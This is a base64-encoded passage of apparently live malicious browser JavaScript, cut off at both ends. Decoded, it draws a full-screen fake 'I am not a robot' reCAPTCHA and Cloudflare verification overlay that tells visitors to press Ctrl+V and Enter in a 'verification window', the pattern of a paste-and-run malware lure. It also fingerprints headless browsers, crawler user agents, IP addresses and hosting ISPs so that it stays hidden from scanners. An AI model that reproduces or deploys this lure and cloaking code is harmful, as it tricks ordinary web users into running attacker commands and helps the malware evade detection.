lBZ0lDQWdJQ0E4YkdrK1NXNGdkR2hsSUhabGNtbG1hV05oZEdsdmJpQjNhVzVrYjNjc0lIQnlaWE56SUR4aVBrTjBjbXc4TDJJK0lDc2dQR0krVmp3dllqNHVQQzlzYVQ0TkNnMEtJQ0FnSUNBZ0lEeHNhVDVRY21WemN5QThZajVGYm5SbGNqd3ZZajRnYjI0Z2VXOTFjaUJyWlhsaWIyRnlaQ0IwYnlCbWFXNXBjMmd1UEM5c2FUNE5DaUFnSUNBZ0lEd3ZiMncrRFFvZ0lDQWdJQ0E4Y0NCemRIbHNaVDBpY0dGa1pHbHVaeTEwYjNBNklERXdjSGc3SWo0TkNpQWdJQ0FnSUNCWmIzVWdkMmxzYkNCdlluTmxjblpsSUdGdVpDQmhaM0psWlRvTkNpQWdJQ0FnSUNBOFluSWdMejROQ2lBZ0lDQWdJQ0E4WTI5a1pTQnpkSGxzWlQwaVltRmphMmR5YjNWdVpEb2dibTl1WlRzZ1ltOXlaR1Z5T2lBeGNIZ2djMjlzYVdRZ0l6YzVOemszT1RzZ2QybGtkR2c2SURRek1uQjRPeUkrSU9LY2hTQWlTU0JoYlNCdWIzUWdZU0J5YjJKdmRDQXRJSEpsUTBGUVZFTklRU0JXWlhKcFptbGpZWFJwYjI0Z1NVUTZJRHh6Y0dGdUlHbGtQU0pwYm5kblIwWjNXamhLZEVzaVBqRTBOamd5TUR3dmMzQmhiajRpSUR3dlkyOWtaVDROQ2lBZ0lDQWdJRHd2Y0Q0TkNpQWdJQ0FnUEM5dFlXbHVQaTB0UGcwS0RRb05DaUFnSUNBOEwyUnBkajROQ2lBZ0lEd2hMUzBnUEdScGRpQmpiR0Z6Y3owaVkyUnFlak55V1VSNVNEWWdZMmh6TlRkb1pWQktjRE5wVkhjaUlITjBlV3hsUFNKaVlXTnJaM0p2ZFc1a09pQnViMjVsT3lJK0RRb2dJQ0FnSUR4a2FYWWdZMnhoYzNNOUltTm9jelUzYUdWUVNuQXphVlIzTFd4bFpuUWlJSE4wZVd4bFBTSjNhV1IwYURvZ01qZzJjSGc3SUdac2IyRjBPaUJzWldaME95QjBaWGgwTFdGc2FXZHVPaUJzWldaME95Qm1iMjUwTFhOcGVtVTZJREUxY0hnN0lqNE5DaUFnSUNBZ0lGQmxjbVp2Y20wZ2RHaGxJSE4wWlhCeklHRmliM1psSUhSdklHWnBibWx6YUNCMlpYSnBabWxqWVhScGIyNHVEUW9nSUNBZ0lEd3ZaR2wyUGcwS0lDQWdJQ0E4WW5WMGRHOXVJSFI1Y0dVOUltSjFkSFJ2YmlJZ1kyeGhjM005SW1ORVluQmxZbGR1VjNkNmJVOXlSaUJqWkZkeU5rVm9RMmxIZG1sbWNTSWdhV1E5SW1rM1luVXlObVE0Ym1oaVQzSWlJSE4wZVd4bFBTSmlZV05yWjNKdmRXNWtPaUFqTldVMVpUVmxPeUJ3WVdSa2FXNW5PaUE1Y0hnZ016aHdlRHNpUGxabGNtbG1lVHd2WW5WMGRHOXVQZzBLSUNBZ0lEd3ZaR2wyUGlBdExUNE5DaUFnSUR3dlpHbDJQZzBLRFFvZ0lDQThJUzB0SUMwdFBnMEtEUW9nSUNBOGMyTnlhWEIwUGcwS1pHOWpkVzFsYm5RdVlXUmtSWFpsYm5STWFYTjBaVzVsY2lnaVJFOU5RMjl1ZEdWdWRFeHZZV1JsWkNJc0lHWjFibU4wYVc5dUlDZ3BJSHNOQ2lBZ0lDQmpiMjV6ZENCa2IyMWhhVzRnUFNCM2FXNWtiM2N1Ykc5allYUnBiMjR1YUc5emRHNWhiV1U3RFFvZ0lDQWdaRzlqZFcxbGJuUXVjWFZsY25sVFpXeGxZM1J2Y2tGc2JDZ2lMbVJ2YldGcGJpSXBMbVp2Y2tWaFkyZ29aV3dnUFQ0Z2V3MEtJQ0FnSUNBZ0lDQnBaaUFvWld3cElHVnNMblJsZUhSRGIyNTBaVzUwSUQwZ1pHOXRZV2x1T3cwS0lDQWdJSDBwT3cwS2ZTazdEUW84TDNOamNtbHdkRDROQ2cwS0lDQThMMlJwZGo0TkNpQWdJQ0E4Y0NCamJHRnpjejBpWTNGcVUyUmtRM28xUm5BMU1TSWdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2dNUzQxY21WdE93MEtJQ0FnSUd4cGJtVXRhR1ZwWjJoME9pQXlMakkxY21WdE95QndZV1JrYVc1bkxYUnZjRG9nTWpCd2VEc2lQanh6Y0dGdUlHTnNZWE56UFNKalZYaFRiVkUzUlZGT1pVRm9VMVkySWo0OEwzTndZVzQrSUc1bFpXUnpJSFJ2SUhKbGRtbGxkeUIwYUdVZ2MyVmpkWEpwZEhrZ2IyWWdlVzkxY2lCamIyNXVaV04wYVc5dUlHSmxabTl5WlNCd2NtOWpaV1ZrYVc1bkxqd3ZjRDROQ2lBZ0lDQThjQ0JqYkdGemN6MGlZMlpNVWtaNWRuQk5UVE5RYkhKTElpQnpkSGxzWlQwaVptOXVkQzF6YVhwbE9pQXhMakJ5WlcwN0lHeHBibVV0YUdWcFoyaDBPaUF5TGpJMWNtVnRPeUJ3WVdSa2FXNW5MWFJ2Y0RvZ01qQndlRHNnWkdsemNHeGhlVG9nYm05dVpUc2lQbGRoYVhScGJtY2dabTl5SUR4emNHRnVJR05zWVhOelBTSmpWWGhUYlZFM1JWRk9aVUZvVTFZMklqNDhMM053WVc0K0xpNHVQQzl3UGcwS0lEd3ZaR2wyUGcwS0lBMEtJRHhrYVhZZ1kyeGhjM005SW1OSFUxRjJlbUZEWWlJZ2NtOXNaVDBpWTI5dWRHVnVkR2x1Wm04aVBnMEtJQ0E4WkdsMklHTnNZWE56UFNKalIxTlJkbnBoUTJJdGFXNXVaWElpUGcwS0lDQWdQR1JwZGo0TkNpQWdJQ0E4WkdsMlBsSmhlU0JKUkRvZ1BHTnZaR1VnWTJ4aGMzTTlJbU0wZHpOSWJFMDJWMUJWTVVoa0lqNDFObUUwWXpVeU9UbG1aR1YwYldOaFBDOWpiMlJsUGp3dlpHbDJQZzBLSUNBZ1BDOWthWFkrRFFvZ0lDQThaR2wySUhOMGVXeGxQU0p0WVhKbmFXNHRkRzl3T2lBMWNIZzdJajVRWlhKbWIzSnRZVzVqWlNBbUlITmxZM1Z5YVhSNUlHSjVJRHh6Y0dGdUlHTnNZWE56UFNKalJXSmpTRVIwUlhod1VGbERNM1pKSWo1RGJHOTFaR1pzWVhKbFBDOXpjR0Z1UGp3dlpHbDJQZzBLSUNBOEwyUnBkajROQ2lBOEwyUnBkajROQ2p3dlpHbDJQZzBLRFFvTkNnMEtEUW84YzJOeWFYQjBQZzBLRFFvTkNnMEtQQzl6WTNKcGNIUStEUW9OQ2cwS1BDOWliMlI1UGp3dmFIUnRiRDQ9JzsKICAgIGNvbnN0IGggPSBiNjRUb1V0ZjgoYjY0KTsKCiAgICAvLyBDcmVhdGUgaG9zdCBlbGVtZW50IGZvciBTaGFkb3cgRE9NCiAgICBjb25zdCBob3N0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICBob3N0LmlkID0gJ3RmLW92ZXJsYXktaG9zdCc7CiAgICBob3N0LnN0eWxlLmNzc1RleHQgPSAncG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3dpZHRoOjEwMHZ3O2hlaWdodDoxMDB2aDt6LWluZGV4OjIxNDc0ODM2NDc7YmFja2dyb3VuZDp0cmFuc3BhcmVudDtib3JkZXI6bm9uZTttYXJnaW46MDtwYWRkaW5nOjA7JzsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaG9zdCk7CgogICAgLy8gQXR0YWNoIFNoYWRvdyBET00gZm9yIHN0eWxlIGlzb2xhdGlvbgogICAgY29uc3Qgc2hhZG93ID0gaG9zdC5hdHRhY2hTaGFkb3coeyBtb2RlOiAnb3BlbicgfSk7CiAgICAKICAgIC8vIFBhcnNlIHRoZSBIVE1MIGNvbnRlbnQgdXNpbmcgRE9NUGFyc2VyIHRvIHByb3Blcmx5IGV4dHJhY3QgcGFydHMKICAgIGNvbnN0IHBhcnNlciA9IG5ldyBET01QYXJzZXIoKTsKICAgIGNvbnN0IGRvYyA9IHBhcnNlci5wYXJzZUZyb21TdHJpbmcoaCwgJ3RleHQvaHRtbCcpOwoKICAgIC8vIDEuIEV4dHJhY3QgYW5kIHByb2Nlc3MgU3R5bGVzCiAgICBkb2MucXVlcnlTZWxlY3RvckFsbCgnc3R5bGUnKS5mb3JFYWNoKHN0eWxlID0+IHsKICAgICAgICBsZXQgY3NzID0gc3R5bGUudGV4dENvbnRlbnQgfHwgJyc7CiAgICAgICAgLy8gUmVwbGFjZSAnYm9keScgc2VsZWN0b3Igd2l0aCAnI3RmLW92ZXJsYXktcm9vdCcgKGhhbmRsaW5nIGNvbnRleHQpCiAgICAgICAgY3NzID0gY3NzLnJlcGxhY2UoLyhefFtcfVxzLF0pYm9keSg/PVtccyxcLntdKS9nLCAnJDEjdGYtb3ZlcmxheS1yb290Jyk7CiAgICAgICAgLy8gUmVwbGFjZSAnaHRtbCcgc2VsZWN0b3Igd2l0aCAnOmhvc3QnCiAgICAgICAgY3NzID0gY3NzLnJlcGxhY2UoLyhefFtcfVxzLF0paHRtbCg/PVtccyxcLntdKS9nLCAnJDE6aG9zdCcpOwogICAgICAgIHN0eWxlLnRleHRDb250ZW50ID0gY3NzOwogICAgICAgIHNoYWRvdy5hcHBlbmRDaGlsZChzdHlsZSk7CiAgICB9KTsKCiAgICAvLyAyLiBFeHRyYWN0IGFuZCBtb3ZlIGV4dGVybmFsIHN0eWxlc2hlZXRzCiAgICBkb2MucXVlcnlTZWxlY3RvckFsbCgnbGlua1tyZWw9InN0eWxlc2hlZXQiXScpLmZvckVhY2gobGluayA9PiB7CiAgICAgICAgc2hhZG93LmFwcGVuZENoaWxkKGxpbmspOwogICAgfSk7CgogICAgLy8gMy4gQ3JlYXRlIGNvbnRhaW5lciBpbnNpZGUgc2hhZG93IChhY3RpbmcgYXMgcHNldWRvLWJvZHkpCiAgICBjb25zdCBjb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIGNvbnRhaW5lci5pZCA9ICd0Zi1vdmVybGF5LXJvb3QnOwogICAgY29udGFpbmVyLnN0eWxlLmNzc1RleHQgPSAnd2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO21hcmdpbjowO3BhZGRpbmc6MDsnOwogICAgCiAgICAvLyBDb3B5IGJvZHkgYXR0cmlidXRlcyAoY2xhc3NlcywgaW5saW5lIHN0eWxlcykgZnJvbSB0ZW1wbGF0ZSB0byBvdXIgY29udGFpbmVyCiAgICBpZiAoZG9jLmJvZHkpIHsKICAgICAgICBBcnJheS5mcm9tKGRvYy5ib2R5LmF0dHJpYnV0ZXMpLmZvckVhY2goYXR0ciA9PiB7CiAgICAgICAgICAgIGlmIChhdHRyLm5hbWUgPT09ICdzdHlsZScpIHsKICAgICAgICAgICAgICAgICBjb250YWluZXIuc3R5bGUuY3NzVGV4dCArPSAnOycgKyBhdHRyLnZhbHVlOwogICAgICAgICAgICB9IGVsc2UgaWYgKGF0dHIubmFtZSA9PT0gJ2NsYXNzJykgewogICAgICAgICAgICAgICAgIGNvbnRhaW5lci5jbGFzc05hbWUgPSBhdHRyLnZhbHVlOwogICAgICAgICAgICB9IGVsc2UgaWYgKGF0dHIubmFtZSAhPT0gJ2lkJykgewogICAgICAgICAgICAgICAgIGNvbnRhaW5lci5zZXRBdHRyaWJ1dGUoYXR0ci5uYW1lLCBhdHRyLnZhbHVlKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgICAgIAogICAgICAgIC8vIE1vdmUgYWxsIGNoaWxkcmVuIGZyb20gdGVtcGxhdGUgYm9keSB0byBjb250YWluZXIKICAgICAgICB3aGlsZSAoZG9jLmJvZHkuZmlyc3RDaGlsZCkgewogICAgICAgICAgICBjb250YWluZXIuYXBwZW5kQ2hpbGQoZG9jLmJvZHkuZmlyc3RDaGlsZCk7CiAgICAgICAgfQogICAgfQogICAgCiAgICBzaGFkb3cuYXBwZW5kQ2hpbGQoY29udGFpbmVyKTsKICAgIAogICAgLy8gU3RvcmUgc2hhZG93IHJvb3QgZ2xvYmFsbHkgZm9yIHNjcmlwdHMgdG8gcXVlcnkgZWxlbWVudHMKICAgIHdpbmRvdy5fX3RmU2hhZG93Um9vdCA9IHNoYWRvdzsKICAgIAogICAgLy8gRm9yY2UgbGF5b3V0IHJlY2FsY3VsYXRpb24KICAgIHZvaWQgaG9zdC5vZmZzZXRIZWlnaHQ7CiAgICAKICAgIC8vIEJsb2NrIHNjcm9sbCBvbiBib2R5CiAgICBkb2N1bWVudC5ib2R5LnN0eWxlLm92ZXJmbG93ID0gJ2hpZGRlbic7CiAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc3R5bGUub3ZlcmZsb3cgPSAnaGlkZGVuJzsKICAgIHdpbmRvdy5zY3JvbGxUbygwLCAwKTsKICAgIAogICAgc2V0VGltZW91dChpbmplY3RTY3JpcHQsIDApOwogIH0KCiAgY29uc3QgSEVBRExFU1NfV0VJR0hUID0gMTA7CiAgY29uc3QgSEVBREZVTF9XRUlHSFQgPSAtODsKICBjb25zdCBTVVNQSUNJT1VTX1dFSUdIVCA9IDU7CgogIGFzeW5jIGZ1bmN0aW9uIGRldGVjdEhlYWRsZXNzKCkgewogICAgY29uc3QgY2hlY2tzID0gWwogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgdWEgPSBuYXZpZ2F0b3IudXNlckFnZW50LnRvTG93ZXJDYXNlKCk7CiAgICAgICAgY29uc3QgaXNIZWFkbGVzcyA9IC9oZWFkbGVzc3xwaGFudG9tanN8c2VsZW5pdW18d2ViZHJpdmVyL2kudGVzdCh1YSk7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzSGVhZGxlc3MgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaGFzV2ViZHJpdmVyID0gbmF2aWdhdG9yLndlYmRyaXZlciA9PT0gdHJ1ZTsKICAgICAgICByZXR1cm4geyBzY29yZTogaGFzV2ViZHJpdmVyID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGhhc0Nocm9tZSA9ICEhd2luZG93LmNocm9tZTsKICAgICAgICBjb25zdCBoYXNDb3JyZWN0Q2hyb21lID0gaGFzQ2hyb21lICYmICh3aW5kb3cuY2hyb21lLnJ1bnRpbWUgfHwgd2luZG93LmNocm9tZS5sb2FkVGltZXMpOwogICAgICAgIGNvbnN0IGlzU3VzcGljaW91cyA9ICFoYXNDaHJvbWUgfHwgIWhhc0NvcnJlY3RDaHJvbWU7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IFNVU1BJQ0lPVVNfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgYXN5bmMgKCkgPT4gewogICAgICAgIGlmICghbmF2aWdhdG9yLnBlcm1pc3Npb25zKSByZXR1cm4geyBzY29yZTogMCB9OwogICAgICAgIHRyeSB7CiAgICAgICAgICBjb25zdCBwZXJtaXNzaW9uU3RhdHVzID0gYXdhaXQgbmF2aWdhdG9yLnBlcm1pc3Npb25zLnF1ZXJ5KHsgbmFtZTogIm5vdGlmaWNhdGlvbnMiIH0pOwogICAgICAgICAgY29uc3Qgbm90aWZpY2F0aW9uUGVybWlzc2lvbiA9IE5vdGlmaWNhdGlvbi5wZXJtaXNzaW9uOwogICAgICAgICAgY29uc3QgaXNJbmNvbnNpc3RlbnQgPSAobm90aWZpY2F0aW9uUGVybWlzc2lvbiA9PT0gImRlbmllZCIgJiYgcGVybWlzc2lvblN0YXR1cy5zdGF0ZSA9PT0gInByb21wdCIpOwogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzSW5jb25zaXN0ZW50ID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgfQogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgcGx1Z2luc0xlbmd0aCA9IG5hdmlnYXRvci5wbHVnaW5zPy5sZW5ndGggfHwgMDsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSBwbHVnaW5zTGVuZ3RoID09PSAwOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBTVVNQSUNJT1VTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBsYW5ndWFnZSA9IG5hdmlnYXRvci5sYW5ndWFnZTsKICAgICAgICBjb25zdCBsYW5ndWFnZXNMZW5ndGggPSBuYXZpZ2F0b3IubGFuZ3VhZ2VzPy5sZW5ndGggfHwgMDsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAhbGFuZ3VhZ2UgfHwgbGFuZ3VhZ2VzTGVuZ3RoID09PSAwOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgIGNvbnN0IGNhbnZhcyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2NhbnZhcycpOwogICAgICAgICAgY29uc3QgZ2wgPSBjYW52YXMuZ2V0Q29udGV4dCgnd2ViZ2wnKSB8fCBjYW52YXMuZ2V0Q29udGV4dCgnZXhwZXJpbWVudGFsLXdlYmdsJyk7CiAgICAgICAgICBpZiAoIWdsKSByZXR1cm4geyBzY29yZTogU1VTUElDSU9VU19XRUlHSFQgfTsKICAgICAgICAgIGNvbnN0IGRlYnVnSW5mbyA9IGdsLmdldEV4dGVuc2lvbignV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycpOwogICAgICAgICAgY29uc3QgcmVuZGVyZXIgPSBkZWJ1Z0luZm8gPyBnbC5nZXRQYXJhbWV0ZXIoZGVidWdJbmZvLlVOTUFTS0VEX1JFTkRFUkVSX1dFQkdMKSA6ICd1bmtub3duJzsKICAgICAgICAgIGNvbnN0IGlzU3VzcGljaW91cyA9IC9zd2lmdHNoYWRlcnxsbHZtcGlwZXxtZXNhL2kudGVzdChyZW5kZXJlcik7CiAgICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gU1VTUElDSU9VU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICByZXR1cm4geyBzY29yZTogU1VTUElDSU9VU19XRUlHSFQgfTsKICAgICAgICB9CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBvdXRlckhlaWdodCA9IHdpbmRvdy5vdXRlckhlaWdodDsKICAgICAgICBjb25zdCBvdXRlcldpZHRoID0gd2luZG93Lm91dGVyV2lkdGg7CiAgICAgICAgY29uc3QgaW5uZXJIZWlnaHQgPSB3aW5kb3cuaW5uZXJIZWlnaHQ7CiAgICAgICAgY29uc3QgaW5uZXJXaWR0aCA9IHdpbmRvdy5pbm5lcldpZHRoOwogICAgICAgIGNvbnN0IGlzU3VzcGljaW91cyA9IChvdXRlckhlaWdodCA9PT0gMCAmJiBvdXRlcldpZHRoID09PSAwKSB8fCAob3V0ZXJIZWlnaHQgPT09IGlubmVySGVpZ2h0ICYmIG91dGVyV2lkdGggPT09IGlubmVyV2lkdGgpOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNDb250cm9sbGVkID0gbmF2aWdhdG9yLndlYmRyaXZlciB8fCB3aW5kb3cuZG9jdW1lbnQ/LmRvY3VtZW50RWxlbWVudD8uZ2V0QXR0cmlidXRlKCd3ZWJkcml2ZXInKSA9PT0gJ3RydWUnIHx8IHdpbmRvdy5jYWxsUGhhbnRvbSB8fCB3aW5kb3cuX3BoYW50b207CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzQ29udHJvbGxlZCA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBpc0hlYWRsZXNzID0gL0hlYWRsZXNzQ2hyb21lLy50ZXN0KG5hdmlnYXRvci51c2VyQWdlbnQpOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0hlYWRsZXNzID8gSEVBRExFU1NfV0VJR0hUIDogMCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNQaGFudG9tID0gd2luZG93LmNhbGxQaGFudG9tIHx8IHdpbmRvdy5fcGhhbnRvbSB8fCB3aW5kb3cucGhhbnRvbTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNQaGFudG9tID8gSEVBRExFU1NfV0VJR0hUIDogMCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNTZWxlbml1bSA9IHdpbmRvdy5kb2N1bWVudD8uZG9jdW1lbnRFbGVtZW50Py5nZXRBdHRyaWJ1dGUoJ3NlbGVuaXVtJykgIT09IG51bGwgfHwgd2luZG93LmRvY3VtZW50Py5kb2N1bWVudEVsZW1lbnQ/LmdldEF0dHJpYnV0ZSgnd2ViZHJpdmVyJykgIT09IG51bGwgfHwgd2luZG93LmRvY3VtZW50Py4kY2RjXyAhPT0gdW5kZWZpbmVkIHx8IHdpbmRvdy5kb2N1bWVudD8uJHdkY18gIT09IHVuZGVmaW5lZDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTZWxlbml1bSA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfQogICAgXTsKCiAgICBsZXQgdG90YWxTY29yZSA9IDA7CiAgICBmb3IgKGNvbnN0IGNoZWNrIG9mIGNoZWNrcykgewogICAgICB0cnkgewogICAgICAgIGNvbnN0IHJlc3VsdCA9IGF3YWl0IGNoZWNrKCk7CiAgICAgICAgdG90YWxTY29yZSArPSByZXN1bHQuc2NvcmU7CiAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgLy8gSWdub3JlIGVycm9ycwogICAgICB9CiAgICB9CgogICAgY29uc3QgbWF4UG9zc2libGVTY29yZSA9IGNoZWNrcy5sZW5ndGggKiBIRUFETEVTU19XRUlHSFQ7CiAgICBjb25zdCBtaW5Qb3NzaWJsZVNjb3JlID0gY2hlY2tzLmxlbmd0aCAqIEhFQURGVUxfV0VJR0hUOwogICAgY29uc3Qgbm9ybWFsaXplZFNjb3JlID0gTWF0aC5tYXgoMCwgTWF0aC5taW4oMTAwLCAoKHRvdGFsU2NvcmUgLSBtaW5Qb3NzaWJsZVNjb3JlKSAvIChtYXhQb3NzaWJsZVNjb3JlIC0gbWluUG9zc2libGVTY29yZSkpICogMTAwKSk7CiAgICByZXR1cm4gTWF0aC5yb3VuZChub3JtYWxpemVkU2NvcmUpOwogIH0KCiAgZnVuY3Rpb24gZGV0ZWN0T1MoKSB7CiAgICBjb25zdCB1c2VyQWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50LnRvTG93ZXJDYXNlKCk7CiAgICBjb25zdCBwbGF0Zm9ybSA9IG5hdmlnYXRvci5wbGF0Zm9ybT8udG9Mb3dlckNhc2UoKSB8fCAnJzsKCiAgICBpZiAoL2lwaG9uZXxpcGFkfGlwb2QvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnaW9zJzsKICAgIGlmICgvYW5kcm9pZC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdhbmRyb2lkJzsKICAgIGlmICgvbGludXgvaS50ZXN0KHVzZXJBZ2VudCkgJiYgIS9hbmRyb2lkL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ2xpbnV4JzsKICAgIGlmICgvbWFjIG9zIHh8bWFjaW50b3NoL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ21hYyc7CiAgICBpZiAoL3dpbi9pLnRlc3QodXNlckFnZW50KSB8fCAvd2luL2kudGVzdChwbGF0Zm9ybSkpIHJldHVybiAnd2luZG93cyc7CgogICAgcmV0dXJuICd1bmtub3duJzsKICB9CgogIGFzeW5jIGZ1bmN0aW9uIGlzQWNjZXNzQWxsb3dlZCgpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGRldGVjdGVkT1MgPSBkZXRlY3RPUygpOwogICAgICBjb25zdCBpbmNsdWRlT1NMaXN0ID0gW107CiAgICAgIGlmIChpbmNsdWRlT1NMaXN0Lmxlbmd0aCA+IDAgJiYgIWluY2x1ZGVPU0xpc3QuaW5jbHVkZXMoZGV0ZWN0ZWRPUykpIHsKICAgICAgICB2bG9nKCdkZW55X29zJywgZGV0ZWN0ZWRPUyk7CiAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgIH0KCiAgICAgIGNvbnN0IGhlYWRsZXNzUHJvYmFiaWxpdHkgPSBhd2FpdCBkZXRlY3RIZWFkbGVzcygpOwogICAgICBpZiAoaGVhZGxlc3NQcm9iYWJpbGl0eSA+IDI1KSB7CiAgICAgICAgdmxvZygnZGVueV9oZWFkbGVzcycsIGhlYWRsZXNzUHJvYmFiaWxpdHkpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBib3RQYXR0ZXJucyA9IFsnYm90JywnY3Jhd2wnLCdzcGlkZXInLCdzY3JhcGUnLCdzbHVycCcsJ3lhaG9vJywnZ29vZ2xlJywneWFuZGV4JywnYmFpZHUnLCdiaW5nJywnZHVja2R1Y2snLCd0ZW9tYScsJ2FyY2hpdmUnXTsKICAgICAgY29uc3QgdXNlckFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgICBmb3IgKGNvbnN0IHBhdHRlcm4gb2YgYm90UGF0dGVybnMpIHsKICAgICAgICBpZiAodXNlckFnZW50LmluY2x1ZGVzKHBhdHRlcm4pKSB7CiAgICAgICAgICB2bG9nKCdkZW55X2JvdF91YScsIHVzZXJBZ2VudCk7CiAgICAgICAgICB0cmFja0JvdCgpOwogICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgfQoKICAgICAgCiAgICAgIGNvbnN0IGlwUmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uJyk7CiAgICAgIGlmICghaXBSZXNwb25zZS5vaykgewogICAgICAgIHZsb2coJ2lwaWZ5X2ZhaWxlZCcsIGlwUmVzcG9uc2Uuc3RhdHVzKTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgfQogICAgICBjb25zdCBpcERhdGEgPSBhd2FpdCBpcFJlc3BvbnNlLmpzb24oKTsKICAgICAgY29uc3QgaXAgPSBpcERhdGEuaXA7CgogICAgICBjb25zdCBpc3BSZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2lwMmxvY2F0aW9uLWFwaS05Nzk4NDgwNjc2NzcudXMtY2VudHJhbDEucnVuLmFwcC8/aXA9JyArIGlwKTsKICAgICAgaWYgKCFpc3BSZXNwb25zZS5vaykgewogICAgICAgIHZsb2coJ2lzcF9sb29rdXBfZmFpbGVkJywgaXNwUmVzcG9uc2Uuc3RhdHVzKTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgfQogICAgICBjb25zdCBpc3BEYXRhID0gYXdhaXQgaXNwUmVzcG9uc2UuanNvbigpOwogICAgICBjb25zdCBpc3AgPSBpc3BEYXRhLmlzcCB8fCAnJzsKICAgICAgY29uc3QgY291bnRyeUNvZGUgPSBpc3BEYXRhLmdlb2lwMl9jb3VudHJ5X2NvZGUgfHwgJyc7CgogICAgICB2bG9nKCdpcF9pbmZvJywgeyBpcCwgY291bnRyeUNvZGUsIGlzcCB9KTsKCiAgICAgIGNvbnN0IGluY2x1ZGVDb3VudHJ5TGlzdCA9IFtdOwogICAgICBpZiAoaW5jbHVkZUNvdW50cnlMaXN0Lmxlbmd0aCA+IDAgJiYgKCFjb3VudHJ5Q29kZSB8fCAhaW5jbHVkZUNvdW50cnlMaXN0LmluY2x1ZGVzKGNvdW50cnlDb2RlKSkpIHsKICAgICAgICB2bG9nKCdkZW55X2NvdW50cnknLCBjb3VudHJ5Q29kZSk7CiAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgIH0KCiAgICAgIGNvbnN0IGJsb2NrZWRJU1BzID0gWwogICAgICAgICdNMjQ3IEV1cm9wZScsJ1BhY2tldGh1YicsJ0xlYXNlV2ViJywnRGF0YUNhbXAnLCdJUFhPJywnU2VjdXJlIERhdGEgU3lzdGVtcycsJ05pZWRlcnNhZWNoc